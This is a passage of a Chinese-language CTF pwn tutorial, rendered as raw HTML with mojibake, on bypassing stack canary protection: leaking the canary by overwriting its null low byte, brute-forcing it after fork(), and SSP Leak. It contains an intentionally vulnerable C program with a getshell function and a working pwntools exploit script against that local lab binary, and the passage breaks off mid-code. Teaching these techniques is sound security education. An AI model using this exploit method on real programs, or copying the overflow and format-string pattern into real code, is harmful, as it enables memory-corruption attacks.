alt="CTF-PWN_Bypasså®‰å…¨æœºåˆ¶5.png"></p><p>ä½† Canary çš„ä½ç½®ä¹Ÿä¸æ˜¯ç»å¯¹çš„ï¼Œéœ€è¦å…·ä½“æƒ…å†µå…·ä½“åˆ†æ</p><p>ä¾‹å¦‚ä¸‹é¢è¿™ä¸ª 32 ä½ç¨‹åºçš„ä¾‹å­ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B63.png" alt="CTF-PWN_Bypasså®‰å…¨æœºåˆ¶3.png"></p><p>å¯ä»¥çœ‹åˆ° <code>v7</code> ä½äº <code>ebp - Ch</code> çš„åœ°æ–¹ï¼Œè€Œä¸æ˜¯ EBP ä¸Šæ–¹çš„ 4 å­—èŠ‚ï¼ˆä¸ EBP ä¸ç›¸é‚»ï¼‰</p><p>åœ¨æ ˆä¸­çš„æ ·å­ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B64.png" alt="CTF-PWN_Bypasså®‰å…¨æœºåˆ¶4.png"></p><p>è¿™é‡Œçš„ Canary åœ¨æ ˆä¸­ä½äº EBP ä¸Šæ–¹çš„ç¬¬ <code>(0xC - 0x0) / 4 = 3</code> ä¸ªä½ç½®</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B66.png" alt="CTF-PWN_Bypasså®‰å…¨æœºåˆ¶6.png"></p><blockquote><p>Canary ä¸€èˆ¬æœ‰å¦‚ä¸‹ç‰¹ç‚¹ï¼š</p><ol><li>åå…­è¿›åˆ¶é€šå¸¸ä»¥ <code>&#39;\x00&#39;</code> ç»“å°¾ï¼Œä¾‹å¦‚ï¼š<code>0x29a30f00</code>ï¼Œåœ¨å†…å­˜ä¸­å…¶å®æ˜¯ <code>0x00 0x0f 0xa3 0x29</code>ï¼Œè¿™æ ·æ˜¯ä¸ºäº†ä¸ Canary å‰é¢çš„å†…å®¹æˆªæ–­ã€‚ä¹Ÿå°±æ˜¯è¯´åœ¨ä¸æº¢å‡ºçš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ— æ³•é€šè¿‡ <code>printf()</code> ä¹‹ç±»çš„å‡½æ•°å°† Canary æ‰“å°å‡ºæ¥ï¼Œå› ä¸ºè¿™äº›å‡½æ•°åœ¨é‡åˆ° Canary ç¬¬ä¸€å­—èŠ‚çš„ <code>0x00</code> å°±è¢«æˆªæ–­äº†  </li><li>æ¯æ¬¡è¿›ç¨‹é‡å¯çš„ Canary éƒ½ä¸åŒï¼Œä½†æ˜¯åŒä¸€ä¸ªè¿›ç¨‹ä¸­çš„ä¸åŒçº¿ç¨‹çš„ Canary æ˜¯ç›¸åŒçš„ï¼Œ<em>ä¹Ÿå°±æ„å‘³ç€ï¼Œåœ¨åŒä¸€æ¬¡ç¨‹åºçš„è¿è¡Œä¸­ï¼Œæ‰€æœ‰çš„ Canary çš„å€¼éƒ½æ˜¯ç›¸åŒçš„</em></li></ol></blockquote><hr><h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²-Canary"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²-Canary" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ² Canary"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ² Canary</h2><blockquote><p>å¦‚æœå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œé‚£ä¹ˆ Canary ä¿æŠ¤åŸºæœ¬ç­‰åŒäºè™šè®¾ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥ç›´æ¥æ³„éœ²å‡º Canary</p></blockquote><p>è¿™ç§ Bypass æ–¹æ³•é‡ç‚¹åœ¨äºç¡®å®š Canary åœ¨æ ˆä¸­çš„ä½ç½®ï¼Œæ³„éœ²æ¯”è¾ƒç®€å•ï¼Œå› æ­¤ä¸åšè¿‡å¤šè§£é‡Š</p><p>å…·ä½“å¦‚ä½•æ³„éœ²ï¼Œå¯ä»¥æŸ¥çœ‹æœ¬ç«™ã€Š<a href="%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A8.md">æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¸åˆ©ç”¨</a>ã€‹è¿™ç¯‡æ–‡ç« </p><hr><h2 id="è¦†ç›–ä½å­—èŠ‚è¾“å‡º-Canary"><a href="#è¦†ç›–ä½å­—èŠ‚è¾“å‡º-Canary" class="headerlink" title="è¦†ç›–ä½å­—èŠ‚è¾“å‡º Canary"></a>è¦†ç›–ä½å­—èŠ‚è¾“å‡º Canary</h2><blockquote><p>å‰é¢æåˆ° Canary çš„åå…­è¿›åˆ¶æ•°å€¼é€šå¸¸ä»¥ <code>&#39;\x00&#39;</code> ç»“å°¾ï¼Œè€Œåœ¨å†…å­˜ä¸­æ˜¯å°ç«¯åºå‚¨å­˜ï¼Œä¾‹å¦‚ï¼š<code>0x29a30f00</code>ï¼Œåœ¨å†…å­˜ä¸­å…¶å®æ˜¯ <code>0x00 0x0f 0xa3 0x29</code>ï¼Œè¿™æ ·æ˜¯ä¸ºäº†è®© <code>&#39;\x00&#39;</code> æˆªæ–­ Canary å‰é¢çš„æ•°æ®ï¼Œé˜²æ­¢å°† Canary æ‰“å°å‡ºæ¥</p><p>é‚£ä¹ˆåŒæ ·çš„æ€è·¯ï¼Œ<strong>å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿè¦†ç›– Canary ä½å­—èŠ‚çš„ <code>&#39;\x00&#39;</code>ï¼Œå°±å¯ä»¥ç›´æ¥å°† Canary è¾“å‡ºäº†</strong></p></blockquote><p>ä»¥ä¸€ä¸ªä¾‹å­è¯´æ˜ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">getshell</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">init_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">vuln_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">init_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Weclome to uf4te!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">vuln_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// gcc -m32 -no-pie -g -o test test.c</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¼–è¯‘åä¿æŠ¤æœºåˆ¶å¦‚ä¸‹ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B67.png" alt="CTF-PWN_Bypasså®‰å…¨æœºåˆ¶7.png"></p><p>è°ƒè¯•æˆ‘ä»¬å‘ç°ï¼ŒCanary åœ¨æ ˆä¸­çš„ EBP ä¸Šæ–¹ç¬¬ä¸‰ä¸ªä½ç½®ï¼ŒCanary ä¸‹æ–¹ç›¸é‚»å¤„æœ‰ä¸€æ¡å³å°†è¢« <code>puts(&quot;Weclome to uf4te!&quot;);</code> è¾“å‡ºçš„å†…å®¹</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B68.png" alt="CTF-PWN_Bypasså®‰å…¨æœºåˆ¶8.png"></p><p>è®¡ç®—ä¸€ä¸‹æˆ‘ä»¬è¾“å…¥çš„ä½ç½®ä¸ä»–ä»¬çš„åç§»ï¼Œå¯ä»¥çœ‹åˆ°è¾“å…¥çš„èµ·å§‹åœ°å€åœ¨ <code>0xffffcd68</code> å¤„</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B69.png" alt="CTF-PWN_Bypasså®‰å…¨æœºåˆ¶9.png"></p><p>ä¸ Canary è·ç¦» 100 å­—èŠ‚ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B610.png" alt="CTF-PWN_Bypasså®‰å…¨æœºåˆ¶10.png"></p><p>å› æ­¤ç¬¬ä¸€æ¬¡ <code>read(0, buf, 0x200);</code> æˆ‘ä»¬å‘é€çš„ payload ä¸ºï¼š<code>payload = b&#39;a&#39; * 100</code>ï¼Œè¿™æ ·å°±åˆšå¥½è¦†ç›–åˆ° Canary çš„ä¸Šä¸€ä¸ªæ•°æ®ï¼Œç„¶åæˆ‘ä»¬ç”¨ <code>io.sendline(payload)</code> æ¥å‘é€ payload</p><p>å› ä¸º <code>io.sendline()</code> ä¼šåœ¨ payload çš„ç»“å°¾æ·»åŠ ä¸€ä¸ªå›è½¦ç¬¦ï¼Œå³ï¼š<code>&#39;0x0a&#39;</code>ï¼Œç›¸å½“äºæˆ‘ä»¬æ€»å…±å‘é€äº† 101 ä¸ªå­—èŠ‚ï¼Œå‰ 100 ä¸ªå­—èŠ‚åˆ°è¾¾ Canary çš„ä½ç½®ï¼Œæœ€åä¸€ä¸ª <code>&#39;0x0a&#39;</code> è¦†ç›– Canary çš„æœ€ä½ä¸€å­—èŠ‚</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B611.png" alt="CTF-PWN_Bypasså®‰å…¨æœºåˆ¶11.png"></p><p>å¯ä»¥çœ‹åˆ°æ­¤æ—¶ Canary çš„æœ€ä½ä¸€å­—èŠ‚ä¸å†æ˜¯ <code>&#39;\x00&#39;</code> è€Œæ˜¯ <code>&#39;\x0a&#39;</code></p><p>ç„¶åç»§ç»­æ‰§è¡Œåˆ° <code>printf(buf);</code> çš„åœ°æ–¹</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B612.png" alt="CTF-PWN_Bypasså®‰å…¨æœºåˆ¶12.png"></p><p>å¯ä»¥çœ‹åˆ°é™¤äº†æˆ‘ä»¬è¾“å…¥çš„ <code>&#39;a&#39;</code> å’Œ <code>&#39;\x0a&#39;</code> å¤–ï¼Œç¨‹åºè¿˜è¾“å‡ºäº†ä¸€äº›åˆ«çš„æ•°æ®ï¼Œ<code>&#39;\x0a&#39;</code> ä»¥åŠå…¶åçš„ 3 å­—èŠ‚ï¼š<code>0x0a 0x91 0x67 0x54</code> å°±æ˜¯ä¿®æ”¹åçš„ Canary çš„å€¼äº†</p><p>æˆ‘ä»¬ç”¨æ³„éœ²å‡ºçš„åœ°å€å‡å» <code>0x0a</code> å°±æ˜¯çœŸæ­£çš„ Canary çš„å€¼</p><p>ç”±äºåœ¨åŒä¸€æ¬¡è¿è¡Œä¸­ï¼ŒCanary çš„å€¼æ˜¯ä¸ä¼šå˜çš„ï¼Œå› æ­¤ç¬¬äºŒæ¬¡ <code>read(0, buf, 0x200);</code> æˆ‘ä»¬åœ¨è¦†ç›–æ—¶è¦ç”¨æ³„éœ²å‡ºçš„ Canary æ›¿æ¢ï¼Œä¿è¯ä¸è¦†ç›– Canary çš„å€¼</p><p>å› æ­¤ exp å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># è®¾ç½®ç³»ç»Ÿæ¶æ„, æ‰“å°è°ƒè¯•ä¿¡æ¯</span><span class="token comment"># arch å¯é€‰ : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN è¿œç¨‹ : content = 0, PWN æœ¬åœ° : content = 1</span>content <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./test"</span><span class="token punctuation">)</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># å°†æœ¬åœ°çš„ Linux ç¨‹åºå¯åŠ¨ä¸ºè¿›ç¨‹ io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./test"</span><span class="token punctuation">)</span><span class="token comment"># é™„åŠ  gdb è°ƒè¯•</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token comment"># åªæœ‰æœ¬åœ°æ‰å¯è°ƒè¯•ï¼Œè¿œç¨‹æ— æ³•è°ƒè¯•</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span>getshell_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"getshell"</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token comment"># debug()</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">)</span>Canary <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xa</span>   <span class="token comment"># ä¸ºäº†æ³„éœ²å‡º Canaryï¼Œå…¶æœ€ä½ä½è¢«æˆ‘ä»¬ä¿®æ”¹ä¸º '\x0a'ï¼Œå› æ­¤å‡å» 0xa åæ‰æ˜¯çœŸæ­£çš„ Canary çš„å€¼</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Canary -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>Canary<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">100</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>Canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">12</span>   <span class="token comment"># å¡«å…… Canary åè·ç¦»è¿”å›åœ°å€è¿˜å·® 12 å­—èŠ‚ï¼Œå› æ­¤å†å¡«å…… b'a' * 12</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>getshell_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment"># ä¸è¿œç¨‹äº¤äº’</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="one-by-one-é€å­—èŠ‚çˆ†ç ´-Canary"><a href="#one-by-one-é€å­—èŠ‚çˆ†ç ´-Canary" class="headerlink" title="one-by-one é€å­—èŠ‚çˆ†ç ´ Canary"></a>one-by-one é€å­—èŠ‚çˆ†ç ´ Canary</h2><blockquote><p>è™½ç„¶æ¯æ¬¡è¿›ç¨‹é‡å¯çš„ Canary éƒ½ä¸åŒï¼Œä½†æ˜¯åŒä¸€ä¸ªè¿›ç¨‹ä¸­çš„ä¸åŒçº¿ç¨‹çš„ Canary æ˜¯ç›¸åŒçš„ï¼Œå¹¶ä¸”<strong>é€šè¿‡ fork å‡½æ•°åˆ›å»ºçš„å­è¿›ç¨‹çš„ Canary ä¹Ÿæ˜¯ç›¸åŒçš„</strong>ï¼ŒåŒæ—¶ <em>Canary çš„æœ€ä½ä¸€å­—èŠ‚ä¸º <code>&#39;\x00&#39;</code> æ˜¯ä¸ä¼šå˜çš„</em>ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘å¯¹ Canary è¿›è¡Œçˆ†ç ´</p></blockquote><p>ä»¥ 64 ä½ç¨‹åºä¸ºä¾‹ï¼Œ64 ä½ç¨‹åºçš„ Canary ä¸€èˆ¬ä¸º 8 å­—èŠ‚ï¼ŒåŒæ—¶æœ€ä½ä¸€å­—èŠ‚ä¸º <code>&#39;\x00&#39;</code></p><p>å› æ­¤ç›¸å½“äºéœ€è¦çˆ†ç ´é«˜ä½çš„ 7 å­—èŠ‚ï¼Œæ¯ä¸€å­—èŠ‚çš„å–å€¼èŒƒå›´åœ¨Â <code>0 ~ 255</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-funcanary2.png" alt="CISCN2023-funcanary2.png"></p><p>ä¾‹å¦‚ä¸Šå›¾ä¸­ï¼Œé€šè¿‡Â <code>fork()</code>Â å‡½æ•°äº§ç”Ÿçš„ canary é‡‘ä¸é›€çš„å€¼æ˜¯å›ºå®šä¸å˜çš„</p><blockquote><p>æ³¨æ„ï¼š</p><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬çˆ†ç ´ Canary çš„è¿‡ç¨‹ä¸­å¦‚æœå‡ºç°é”™è¯¯ï¼Œå°±ä¼šå¯¼è‡´ç¨‹åºå´©æºƒï¼Œå› æ­¤é€šå¸¸æ˜¯ä¸å¯è¡Œçš„</p><p>ä½†æ˜¯è¿™é‡Œæ˜¯é€šè¿‡Â <code>fork()</code>Â å‡½æ•°ç”Ÿæˆäº†å­çº¿ç¨‹ï¼Œ<strong>å­è¿›ç¨‹å´©æºƒä¸ä¼šå¯¼è‡´çˆ¶è¿›ç¨‹é€€å‡º</strong>ï¼Œå› æ­¤å¯ä»¥çˆ†ç ´</p></blockquote><p>å…·ä½“ä¾‹é¢˜è§æœ¬ç«™çš„ã€Š<a href="%E3%80%90CISCN%202023%E3%80%91funcanary.md">ã€CISCN 2023ã€‘funcanary</a>ã€‹</p><hr><h2 id="SSP-Leak-ç»•è¿‡-Canary"><a href="#SSP-Leak-ç»•è¿‡-Canary" class="headerlink" title="SSP Leak ç»•è¿‡ Canary"></a>SSP Leak ç»•è¿‡ Canary</h2><blockquote><p>å…¨ç§°æ˜¯ Stack Smashing Protect Leakï¼Œå…¶å®å°±æ˜¯åˆ©ç”¨äº†æˆ‘ä»¬å‰é¢æåˆ°çš„è§¦å‘ Canary åä¼šè¾“å‡ºï¼š<code>*** stack smashing detected ***: terminated</code>ï¼Œé€šè¿‡æ•…æ„è§¦å‘ Canary ä¿æŠ¤å¹¶ä¿®æ”¹è¦è¾“å‡ºçš„å˜é‡ <code>__libc_argv[0]</code> çš„åœ°å€æ¥å®ç°ä»»æ„åœ°å€è¯»å–</p><p><em>è¿™ä¸ªé—®é¢˜ä¾èµ–äº Glibc çš„ç‰ˆæœ¬ï¼Œåœ¨ Ubuntu 22.04 çš„ Glibc 2.35 ä¸­å·²ç»ä¿®å¤ï¼Œå¦‚æœæƒ³åœ¨æœ¬åœ°å¤ç°å°±éœ€è¦æ›´æ¢ Glibc ç‰ˆæœ¬ï¼ŒGlibc 2.26 ä»¥åæ‰€æœ‰ä¿®æ”¹ï¼Œç›®å‰å·²çŸ¥ Glibc 2.25 åŠä»¥ä¸‹ç‰ˆæœ¬éƒ½æœªä¿®å¤è¯¥æ¼æ´</em> </p><p><mark>æ³¨æ„ï¼šSSP Leak åªèƒ½æ³„éœ²å†…å­˜ä¸­çš„æ•°æ®ï¼Œä½†æ— æ³•è·å¾— shell</mark></p></blockquote><p>é¦–å…ˆåˆ†æä¸€ä¸‹è§¦å‘ Canary åæ‰§è¡Œçš„ <code>__stack_chk_fail</code> å‡½æ•°</p><p>ç”±äºè¿™ä¸ªå‡½æ•°æ˜¯ Glibc ä¸­çš„ï¼Œæƒ³æŸ¥çœ‹éœ€è¦ä¸‹è½½ Glibc æºç ï¼Œä¸‹è½½åœ°å€ï¼š<a href="https://ftp.gnu.org/gnu/glibc/">Index of &#x2F;gnu&#x2F;glibc</a></p><p>å…ˆæ¥çœ‹çœ‹æ—§çš„ç‰ˆæœ¬ Glibc 2.19 ä¸­çš„å®ç°</p><p>åœ¨ <code>./debug/stack_chk_fail.c</code> ä¸‹æ‰¾åˆ° <code>__stack_chk_fail</code> å‡½æ•°çš„æºç ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// ./glibc-2.19/debug/stack_chk_fail.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">extern</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>__libc_argv attribute_hidden<span class="token punctuation">;</span><span class="token keyword">void</span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">__stack_chk_fail</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token string">"stack smashing detected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ <code>./debug/fortify_fail.c</code> ä¸‹æ‰¾åˆ° <code>__fortify_fail</code> å‡½æ•°çš„æºç ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// ./glibc-2.19/debug/fortify_fail.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">extern</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>__libc_argv attribute_hidden<span class="token punctuation">;</span><span class="token keyword">void</span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">__fortify_fail</span> <span class="token punctuation">(</span>msg<span class="token punctuation">)</span>     <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">;</span><span class="token punctuation">&#123;</span>  <span class="token comment">/* The loop is added only to keep gcc happy.  */</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token function">__libc_message</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"*** %s ***: %s terminated\n"</span><span class="token punctuation">,</span>    msg<span class="token punctuation">,</span> __libc_argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">:</span> <span class="token string">"&lt;unknown>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>__fortify_fail<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€»è¾‘å¾ˆæ¸…æ™°ï¼Œ<code>__stack_chk_fail</code> å‡½æ•°ä¼šè°ƒç”¨ <code>__fortify_fail</code> å‡½æ•°è¾“å‡ºåˆšåˆšçš„ <code>*** stack smashing detected ***: terminated</code> ä¿¡æ¯</p><p>ä½†æ˜¯ç»†å¿ƒä¸€ç‚¹ä¼šå‘ç°ï¼Œè¿™é‡Œå­˜åœ¨ä¸¤ä¸ª <code>&#39;%s&#39;</code>ï¼Œåé¢è¿˜æœ‰ä¸ª <code>__libc_argv[0]</code> å‚æ•°ï¼Œå› æ­¤<em>å®é™…ä¸Šæ˜¯è¾“å‡ºäº† <code>msg</code> å’Œ <code>__libc_argv[0]</code> ä¸¤ä¸ªå‚æ•°çš„å†…å®¹</em></p><blockquote><p><code>msg</code> æ˜¯å›ºå®šçš„ <code>&quot;stack smashing detected&quot;</code>ï¼Œ<code>__libc_argv[0]</code> é»˜è®¤ä¸ºç¨‹åºå</p></blockquote><p>å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬èƒ½ä¿®æ”¹ <code>__libc_argv[0]</code> çš„å€¼ä¸ºæŸä¸ªåœ°å€ï¼Œå°±å¯ä»¥å°†è¯¥åœ°å€ä¸Šçš„ä¿¡æ¯åœ¨ <code>&quot;*** %s ***: %s terminated\n&quot;</code> ä¸­è¾“å‡ºå‡ºæ¥</p><p>ä» Glibc 2.26 å¼€å§‹ï¼Œå¢åŠ äº†ä¸€ä¸ª <code>need_backtrace</code> å˜é‡æ¥æ§åˆ¶è¾“å‡ºçš„ä¿¡æ¯ï¼Œè¿™æ—¶ <code>__libc_argv[0]</code> é»˜è®¤ä¸º <code>&lt;unknown&gt;</code>ï¼Œæºç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// ./glibc-2.26/debug/fortify_fail.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token 